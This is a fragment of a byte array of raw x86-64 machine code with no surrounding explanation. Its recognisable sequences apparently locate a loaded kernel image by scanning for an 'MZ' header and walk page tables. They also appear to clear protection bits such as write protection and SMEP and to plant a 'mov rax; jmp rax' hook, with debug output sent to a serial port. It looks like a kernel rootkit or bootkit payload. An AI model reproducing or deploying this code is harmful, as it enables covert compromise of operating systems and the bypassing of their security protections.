    0x70, 0x06, 0x0F, 0x83, 0x24, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC3, 0x20, 0x44, 0x8B, 0x5B, 0x1C,
    0x41, 0x0F, 0xBA, 0xE3, 0x1D, 0x0F, 0x83, 0xD5, 0x00, 0x00, 0x00, 0x8B, 0x13, 0x41, 0xC1, 0xEB,
    0x1F, 0x48, 0x81, 0xFA, 0x00, 0x00, 0x40, 0x00, 0x0F, 0x87, 0xC2, 0x00, 0x00, 0x00, 0x44, 0x8B,
    0x43, 0x08, 0x48, 0x8D, 0x82, 0x00, 0x02, 0x00, 0x00, 0x4C, 0x3B, 0xC0, 0x0F, 0x86, 0xAE, 0x00,
    0x00, 0x00, 0x8B, 0x4B, 0x04, 0x48, 0x8D, 0x46, 0x0F, 0x48, 0x03, 0xC1, 0x48, 0x03, 0xC2, 0x48,
    0x83, 0xE0, 0xF0, 0x48, 0x2B, 0xC8, 0x48, 0x89, 0x45, 0xC0, 0x4C, 0x8D, 0x34, 0x0E, 0x4D, 0x03,
    0xF0, 0x4D, 0x3B, 0xF7, 0x0F, 0x82, 0x86, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x48, 0x8D, 0x53, 0xF8,
    0x48, 0x89, 0x4D, 0xD0, 0x88, 0x4D, 0xD8, 0x48, 0x8D, 0x4D, 0xD0, 0x48, 0x3B, 0xCA, 0x74, 0x13,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xD0, 0xE8, 0x31, 0x12, 0x00, 0x00, 0x48,
    0x8B, 0x45, 0xC0, 0x4D, 0x8B, 0xCE, 0x44, 0x89, 0x5C, 0x24, 0x20, 0x4C, 0x8B, 0xC0, 0x48, 0x8D,
    0x55, 0xD0, 0x48, 0x8D, 0x0D, 0x2F, 0x29, 0x00, 0x00, 0xE8, 0xFE, 0xFA, 0xFF, 0xFF, 0x80, 0x7D,
    0xD0, 0x2E, 0x75, 0x18, 0x80, 0x7D, 0xD1, 0x74, 0x75, 0x12, 0x80, 0x7D, 0xD2, 0x65, 0x75, 0x0C,
    0x80, 0x7D, 0xD3, 0x78, 0x75, 0x06, 0x80, 0x7D, 0xD4, 0x74, 0x74, 0x05, 0x4D, 0x3B, 0xF4, 0x77,
    0x05, 0x48, 0x85, 0xFF, 0x75, 0x1A, 0x48, 0x8B, 0x7D, 0xC0, 0x48, 0x8D, 0x55, 0xD0, 0x41, 0xB8,
    0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE0, 0x4D, 0x8B, 0xE6, 0xE8, 0xD0, 0x11, 0x00, 0x00,
    0x4C, 0x8B, 0x5D, 0xC8, 0x41, 0xFF, 0xC5, 0x48, 0x83, 0xC3, 0x28, 0x41, 0x0F, 0xB7, 0x4B, 0x06,
    0x44, 0x3B, 0xE9, 0x0F, 0x8C, 0x03, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xF6, 0x48, 0x85, 0xFF, 0x74,
    0x1B, 0x4D, 0x8B, 0xCC, 0x4C, 0x8D, 0x45, 0xE0, 0x48, 0x8B, 0xD7, 0x48, 0x8D, 0x0D, 0xEE, 0x28,
    0x00, 0x00, 0xE8, 0x85, 0xFA, 0xFF, 0xFF, 0x48, 0x8B, 0xC7, 0xEB, 0x59, 0x49, 0x8B, 0xCE, 0x4C,
    0x8D, 0x05, 0x12, 0x29, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x46, 0x38, 0x34, 0x01, 0x75, 0xF7, 0x48,
    0x85, 0xC9, 0x75, 0x0E, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4,
    0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0x4D, 0x8B,
    0xCE, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49,
    0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xE3, 0x48, 0x85,
    0xC9, 0x75, 0xCF, 0x33, 0xC0, 0x48, 0x8B, 0x4D, 0xF0, 0x48, 0x33, 0xCC, 0xE8, 0xD1, 0xF7, 0xFF,
    0xFF, 0x48, 0x8B, 0x9C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x70, 0x41, 0x5F, 0x41,
    0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,
    0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x4C, 0x89, 0x64, 0x24, 0x18, 0x41, 0x55, 0x41, 0x56, 0x41,
    0x57, 0x48, 0x81, 0xEC, 0x60, 0x01, 0x00, 0x00, 0x33, 0xED, 0x4C, 0x8D, 0x0D, 0x97, 0x28, 0x00,
    0x00, 0x44, 0x8B, 0xC5, 0x4C, 0x8B, 0xE2, 0x4C, 0x8B, 0xE9, 0x49, 0xFF, 0xC0, 0x43, 0x38, 0x2C,
    0x08, 0x75, 0xF7, 0x4D, 0x85, 0xC0, 0x75, 0x0E, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60,
    0x3C, 0x60, 0x75, 0xF4, 0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60,
    0x75, 0xF4, 0x48, 0x8B, 0xCD, 0x4D, 0x85, 0xC0, 0x74, 0x1D, 0x41, 0x8A, 0x01, 0xBA, 0xF8, 0x03,
    0x00, 0x00, 0xEE, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x49, 0xFF, 0xC1, 0x48, 0x83, 0xF9, 0x10,
    0x72, 0xE3, 0x4D, 0x85, 0xC0, 0x75, 0xCF, 0x48, 0x8B, 0x05, 0x9A, 0x37, 0x00, 0x00, 0x48, 0xC7,
    0xC3, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0x5C, 0x37, 0x00, 0x00, 0x48, 0x89, 0x88, 0xE8,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x78, 0x01, 0x00, 0x00, 0x48, 0x23, 0xD8, 0xB8, 0x4D,
    0x5A, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x81, 0xEB, 0x00, 0x10, 0x00, 0x00, 0x66, 0x39, 0x03, 0x75,
    0xF4, 0x48, 0x89, 0x1D, 0x40, 0x37, 0x00, 0x00, 0x33, 0xC9, 0x48, 0x8B, 0x9B, 0x98, 0xBF, 0x21,
    0x00, 0xE8, 0x92, 0xFC, 0xFF, 0xFF, 0x48, 0x83, 0xC3, 0x10, 0x48, 0x8B, 0x13, 0xEB, 0x56, 0x48,
    0x85, 0xD2, 0x74, 0x4E, 0x0F, 0xB7, 0x4A, 0x58, 0x48, 0x8D, 0x05, 0x11, 0x28, 0x00, 0x00, 0x4C,
    0x8B, 0x42, 0x60, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xFA, 0x00, 0x00, 0x00, 0x45, 0x0F, 0xB7, 0x08,
    0x66, 0x45, 0x85, 0xC9, 0x74, 0x1C, 0x66, 0x44, 0x39, 0x08, 0x75, 0x16, 0x48, 0x83, 0xF9, 0x01,
    0x76, 0x10, 0x48, 0x83, 0xC0, 0x02, 0x49, 0x83, 0xC0, 0x02, 0x48, 0xFF, 0xC9, 0x66, 0x39, 0x28,
    0x75, 0xDA, 0x0F, 0xB7, 0x08, 0x41, 0x0F, 0xB7, 0x00, 0x48, 0x3B, 0xC8, 0x0F, 0x84, 0xC4, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x12, 0x48, 0x3B, 0xD3, 0x75, 0xA5, 0xBA, 0xA0, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xE8, 0x60, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24,
    0xC0, 0x00, 0x00, 0x00, 0xBD, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x10, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x20, 0x0F, 0x10, 0x48, 0x10, 0x0F, 0x11, 0x01, 0x0F, 0x10, 0x40, 0x20, 0x0F, 0x11, 0x49, 0x10,
    0x0F, 0x10, 0x48, 0x30, 0x0F, 0x11, 0x41, 0x20, 0x0F, 0x10, 0x40, 0x40, 0x0F, 0x11, 0x49, 0x30,
    0x0F, 0x10, 0x48, 0x50, 0x0F, 0x11, 0x41, 0x40, 0x0F, 0x10, 0x40, 0x60, 0x0F, 0x11, 0x49, 0x50,
    0x0F, 0x10, 0x0C, 0x28, 0x0F, 0x11, 0x41, 0x60, 0x0F, 0x10, 0x40, 0x70, 0x0F, 0x11, 0x44, 0x29,
    0xF0, 0x0F, 0x10, 0x44, 0x28, 0x10, 0x0F, 0x11, 0x0C, 0x29, 0x0F, 0x11, 0x44, 0x29, 0x10, 0x4C,
    0x8B, 0x7C, 0x24, 0x50, 0xBA, 0xE0, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCF, 0xE8, 0x23, 0xFC, 0xFF,
    0xFF, 0x4C, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0xC9, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x4C,
    0x8D, 0x05, 0x4A, 0x27, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01, 0x00, 0x75, 0xF6,
    0x48, 0x85, 0xC9, 0x75, 0x71, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75,
    0xF4, 0xE9, 0x91, 0x00, 0x00, 0x00, 0x0F, 0x10, 0x02, 0x48, 0x8D, 0x44, 0x24, 0x20, 0xBD, 0x80,
    0x00, 0x00, 0x00, 0x0F, 0x10, 0x4A, 0x10, 0x0F, 0x11, 0x00, 0x0F, 0x10, 0x42, 0x20, 0x0F, 0x11,
    0x48, 0x10, 0x0F, 0x10, 0x4A, 0x30, 0x0F, 0x11, 0x40, 0x20, 0x0F, 0x10, 0x42, 0x40, 0x0F, 0x11,
    0x48, 0x30, 0x0F, 0x10, 0x4A, 0x50, 0x0F, 0x11, 0x40, 0x40, 0x0F, 0x10, 0x42, 0x60, 0x0F, 0x11,
    0x48, 0x50, 0x0F, 0x10, 0x0C, 0x2A, 0x0F, 0x11, 0x40, 0x60, 0x0F, 0x10, 0x42, 0x70, 0x0F, 0x11,
    0x44, 0x28, 0xF0, 0x0F, 0x10, 0x44, 0x2A, 0x10, 0x0F, 0x11, 0x0C, 0x28, 0x0F, 0x11, 0x44, 0x28,
    0x10, 0xE9, 0x59, 0xFF, 0xFF, 0xFF, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60,
    0x75, 0xF4, 0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03,
    0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10,
    0x72, 0xE3, 0x48, 0x85, 0xC9, 0x75, 0xCF, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xD7, 0xFA, 0xFF,
    0xFF, 0xE9, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE3, 0x34, 0x00, 0x00, 0x4C, 0x3B, 0xF2,
    0x74, 0x0E, 0x41, 0xB8, 0x53, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCE, 0xE8, 0x70, 0x0E, 0x00, 0x00,
    0x49, 0x8D, 0x5E, 0x60, 0x48, 0x8B, 0xD5, 0x48, 0x8B, 0xCB, 0xE8, 0xED, 0x0D, 0x00, 0x00, 0x49,
    0x8B, 0xCF, 0x4C, 0x89, 0x3B, 0xE8, 0xAA, 0xF8, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x7F, 0x26, 0x00,
    0x00, 0x48, 0x89, 0x43, 0x08, 0x49, 0x8B, 0xCF, 0xE8, 0xF7, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15,
    0x8C, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8B, 0xCF, 0xE8, 0xE4, 0xF7, 0xFF, 0xFF,
    0x48, 0x8D, 0x15, 0x99, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x18, 0x49, 0x8B, 0xCF, 0xE8, 0xD1,
    0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x96, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x20, 0x49, 0x8B,
    0xCF, 0xE8, 0xBE, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x93, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43,
    0x28, 0x49, 0x8B, 0xCF, 0xE8, 0xAB, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x90, 0x26, 0x00, 0x00,
    0x48, 0x89, 0x43, 0x30, 0x49, 0x8B, 0xCF, 0xE8, 0x98, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x9D,
    0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x38, 0x49, 0x8B, 0xCF, 0xE8, 0x85, 0xF7, 0xFF, 0xFF, 0x48,
    0x8D, 0x15, 0xAA, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x40, 0x49, 0x8B, 0xCF, 0xE8, 0x72, 0xF7,
    0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xB7, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x48, 0x49, 0x8B, 0xCF,
    0xE8, 0x5F, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xB4, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x50,
    0x49, 0x8B, 0xCF, 0xE8, 0x4C, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xC1, 0x26, 0x00, 0x00, 0x48,
    0x89, 0x43, 0x58, 0x49, 0x8B, 0xCF, 0xE8, 0x39, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xCE, 0x26,
    0x00, 0x00, 0x48, 0x89, 0x43, 0x60, 0x49, 0x8B, 0xCF, 0xE8, 0x26, 0xF7, 0xFF, 0xFF, 0x48, 0x8D,
    0x15, 0xDB, 0x26, 0x00, 0x00, 0x48, 0x89, 0x43, 0x68, 0x49, 0x8B, 0xCF, 0xE8, 0x13, 0xF7, 0xFF,
    0xFF, 0x48, 0x89, 0x43, 0x70, 0x48, 0x8D, 0x0D, 0xDC, 0x26, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xA5,
    0x0A, 0x00, 0x00, 0x48, 0x89, 0x1D, 0xFE, 0x33, 0x00, 0x00, 0x48, 0x89, 0x43, 0x78, 0x49, 0x8B,
    0xD7, 0x49, 0x89, 0x5E, 0x1D, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89, 0x05, 0x00, 0x34, 0x00, 0x00,
    0x4C, 0x89, 0x35, 0xF1, 0x33, 0x00, 0x00, 0x48, 0x89, 0x1D, 0xE2, 0x33, 0x00, 0x00, 0xE8, 0x09,
    0xF6, 0xFF, 0xFF, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x0D, 0xB3, 0x26, 0x00, 0x00, 0x49, 0x8B, 0xD6,
    0xE8, 0xF7, 0xF5, 0xFF, 0xFF, 0x48, 0x8B, 0x53, 0x08, 0x48, 0x8D, 0x0D, 0xC8, 0x26, 0x00, 0x00,
    0xE8, 0xE7, 0xF5, 0xFF, 0xFF, 0x48, 0x8B, 0x53, 0x78, 0x48, 0x8D, 0x0D, 0xE0, 0x26, 0x00, 0x00,
    0xE8, 0xD7, 0xF5, 0xFF, 0xFF, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x29, 0xF9, 0xFF, 0xFF, 0x33,
    0xC9, 0x4C, 0x8D, 0x0D, 0xF0, 0x26, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x09, 0x00,
    0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x0E, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C,
    0x60, 0x75, 0xF4, 0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75,
    0xF4, 0x45, 0x33, 0xC0, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x01, 0xBA, 0xF8, 0x03, 0x00,
    0x00, 0xEE, 0x49, 0xFF, 0xC0, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC1, 0x49, 0x83, 0xF8, 0x10, 0x72,
    0xE3, 0x48, 0x85, 0xC9, 0x75, 0xCF, 0x49, 0x8B, 0xD4, 0x49, 0x8B, 0xCD, 0x4C, 0x8D, 0x9C, 0x24,
    0x60, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x20, 0x49, 0x8B, 0x6B, 0x28, 0x4D, 0x8B, 0x63, 0x30,
    0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x48, 0xFF, 0x25, 0x38, 0x33, 0x00, 0x00,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x55,
    0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0x05, 0x62, 0x33, 0x00, 0x00, 0x48, 0x33,
    0xC4, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x05, 0xFC, 0x32, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xE0,
    0x48, 0x8B, 0x35, 0xF9, 0x32, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xEA, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x45, 0xE0, 0x48, 0xC7, 0x45, 0xE8, 0x48, 0xB8, 0x00, 0x00, 0xC7, 0x45, 0xF0,
    0x00, 0x00, 0xFF, 0xE0, 0xE8, 0x07, 0x0C, 0x00, 0x00, 0xE8, 0x62, 0xF2, 0xFF, 0xFF, 0x48, 0x8B,
    0xD8, 0xE8, 0x8A, 0xF2, 0xFF, 0xFF, 0x4C, 0x8B, 0xC0, 0x48, 0x8D, 0x0D, 0x40, 0x26, 0x00, 0x00,
    0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xF8, 0xE8, 0xD1, 0xF4, 0xFF, 0xFF, 0x48, 0x8B, 0xCF, 0x48, 0x0F,
    0xBA, 0xF1, 0x14, 0xE8, 0x58, 0xF2, 0xFF, 0xFF, 0x48, 0x8B, 0xCB, 0x48, 0x0F, 0xBA, 0xF1, 0x10,
    0xE8, 0x3B, 0xF2, 0xFF, 0xFF, 0x0F, 0xAE, 0xF8, 0x48, 0x8D, 0x45, 0xE8, 0x48, 0x3B, 0xF0, 0x74,
    0x12, 0x41, 0xB8, 0x0C, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xE8, 0x48, 0x8B, 0xCE, 0xE8, 0xAD,
    0x0B, 0x00, 0x00, 0x0F, 0xAE, 0xF8, 0x48, 0x8B, 0xCB, 0xE8, 0x12, 0xF2, 0xFF, 0xFF, 0x48, 0x8B,
    0xCF, 0xE8, 0x1A, 0xF2, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x03, 0x26, 0x00, 0x00, 0xE8, 0x7A, 0xF4,
    0xFF, 0xFF, 0x48, 0x8B, 0x4D, 0xF8, 0x48, 0x33, 0xCC, 0xE8, 0x24, 0xF2, 0xFF, 0xFF, 0x48, 0x8B,
    0x5C, 0x24, 0x50, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x60, 0x48, 0x83, 0xC4,
    0x40, 0x5D, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89,
    0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x33, 0xC9, 0x4C, 0x8D, 0x05, 0xD7, 0x25, 0x00,
    0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01, 0x00, 0x75, 0xF6, 0xBE, 0xFD, 0x03, 0x00, 0x00,
    0x40, 0xB7, 0x60, 0x48, 0x85, 0xC9, 0x75, 0x0D, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A,
    0xC7, 0x75, 0xF5, 0xEB, 0x30, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A, 0xC7, 0x75, 0xF5,
    0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00,
    0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xE3,
    0x48, 0x85, 0xC9, 0x75, 0xD0, 0x48, 0x8B, 0x2D, 0xB4, 0x31, 0x00, 0x00, 0x48, 0x85, 0xED, 0x0F,
    0x84, 0x3B, 0x01, 0x00, 0x00, 0x48, 0x83, 0x3D, 0xB3, 0x31, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x2D,
    0x01, 0x00, 0x00, 0x48, 0x83, 0x3D, 0x9D, 0x31, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x1F, 0x01, 0x00,
    0x00, 0x48, 0x8B, 0x55, 0x78, 0x48, 0x8D, 0x0D, 0xAC, 0x25, 0x00, 0x00, 0xE8, 0xAB, 0xF3, 0xFF,
    0xFF, 0x48, 0x8B, 0x05, 0x98, 0x31, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x78, 0x48, 0x8B, 0x48, 0x58,
    0x48, 0x8B, 0x41, 0x40, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8B, 0x55, 0x78, 0x48, 0x8D, 0x0D, 0xB5,
    0x25, 0x00, 0x00, 0xE8, 0x84, 0xF3, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0x59, 0x31, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xD2, 0x25, 0x00, 0x00, 0x48, 0x89, 0x2D, 0x3B, 0x31, 0x00, 0x00, 0x48, 0x8B, 0xD5,
    0x48, 0x89, 0x68, 0x1D, 0xE8, 0x63, 0xF3, 0xFF, 0xFF, 0x48, 0x83, 0x7D, 0x08, 0x00, 0x75, 0x61,
    0x33, 0xC9, 0x4C, 0x8D, 0x05, 0xDF, 0x25, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01,
    0x00, 0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x10, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A,
    0xC7, 0x75, 0xF5, 0xE9, 0xED, 0x00, 0x00, 0x00, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A,
    0xC7, 0x75, 0xF5, 0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xD6, 0x00, 0x00, 0x00, 0x41,
    0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF,
    0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xDF, 0x48, 0x85, 0xC9, 0x75, 0xCC, 0xE9, 0xB4, 0x00, 0x00,
    0x00, 0xE8, 0xAA, 0xFD, 0xFF, 0xFF, 0x33, 0xC9, 0x4C, 0x8D, 0x05, 0xB1, 0x25, 0x00, 0x00, 0x48,
    0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01, 0x00, 0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x10, 0x8B, 0xD6,
    0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A, 0xC7, 0x75, 0xF5, 0xE9, 0x87, 0x00, 0x00, 0x00, 0x8B, 0xD6,
    0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A, 0xC7, 0x75, 0xF5, 0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74,
    0x74, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9,
    0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xE3, 0x48, 0x85, 0xC9, 0x75, 0xD0, 0xEB, 0x55,
    0x33, 0xC9, 0x4C, 0x8D, 0x05, 0x5F, 0x24, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01,
    0x00, 0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x0D, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A,
    0xC7, 0x75, 0xF5, 0xEB, 0x30, 0x8B, 0xD6, 0xEC, 0x40, 0x22, 0xC7, 0x40, 0x3A, 0xC7, 0x75, 0xF5,
    0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00,
    0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xE3,
    0x48, 0x85, 0xC9, 0x75, 0xD0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48,
    0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0x40, 0x55, 0x53, 0x56,
    0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x48,
    0x33, 0xDB, 0x41, 0xB8, 0xFF, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xFA, 0x48, 0x89, 0x5D, 0x48, 0x4C,
    0x8B, 0xF2, 0x49, 0xC1, 0xEF, 0x0C, 0x48, 0x8B, 0xF2, 0x49, 0xC1, 0xEE, 0x15, 0x48, 0xC1, 0xEE,
    0x1E, 0x44, 0x8D, 0x6B, 0x01, 0x4C, 0x8B, 0xE2, 0x48, 0x89, 0x5D, 0x50, 0x48, 0x8B, 0xFA, 0x4D,
    0x23, 0xF8, 0x48, 0x8B, 0x15, 0xAF, 0x2F, 0x00, 0x00, 0x4D, 0x23, 0xF0, 0x49, 0x23, 0xF0, 0x41,
    0x81, 0xE4, 0xFF, 0x0F, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x85, 0xD2, 0x74, 0x3D, 0x4C, 0x8B, 0x52,
    0x20, 0x4D, 0x85, 0xD2, 0x74, 0x34, 0x48, 0x83, 0xE1, 0xF0, 0x48, 0x8B, 0xC7, 0x48, 0xC1, 0xE8,
    0x27, 0x45, 0x8B, 0xCD, 0x49, 0x23, 0xC0, 0x44, 0x8D, 0x43, 0x08, 0x48, 0x8D, 0x14, 0xC1, 0x48,
    0x8D, 0x45, 0x48, 0x48, 0x8D, 0x4D, 0x50, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x48,
    0x8B, 0x45, 0x50, 0x48, 0x8B, 0x15, 0x5E, 0x2F, 0x00, 0x00, 0x41, 0x84, 0xC5, 0x0F, 0x84, 0x22,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x5D, 0x58, 0x48, 0x8B, 0xCB, 0x49, 0xB8, 0x00, 0xF0, 0xFF, 0xFF,
    0x0F, 0x00, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x74, 0x3E, 0x4C, 0x8B, 0x52, 0x20, 0x4D, 0x85, 0xD2,
    0x74, 0x35, 0x49, 0x23, 0xC0, 0x48, 0x8D, 0x4D, 0x58, 0x45, 0x8B, 0xCD, 0x41, 0xB8, 0x08, 0x00,
    0x00, 0x00, 0x48, 0x8D, 0x14, 0xF0, 0x48, 0x8D, 0x45, 0x48, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41,
    0xFF, 0xD2, 0x48, 0x8B, 0x4D, 0x58, 0x49, 0xB8, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x15, 0x01, 0x2F, 0x00, 0x00, 0x41, 0x84, 0xCD, 0x0F, 0x84, 0xC5, 0x00, 0x00, 0x00,
    0x84, 0xC9, 0x79, 0x1B, 0x48, 0xB8, 0x00, 0x00, 0x00, 0xC0, 0xFF, 0xFF, 0x0F, 0x00, 0x48, 0x23,
    0xC1, 0x81, 0xE7, 0xFF, 0xFF, 0xFF, 0x3F, 0x48, 0x03, 0xC7, 0xE9, 0xA8, 0x00, 0x00, 0x00, 0x48,
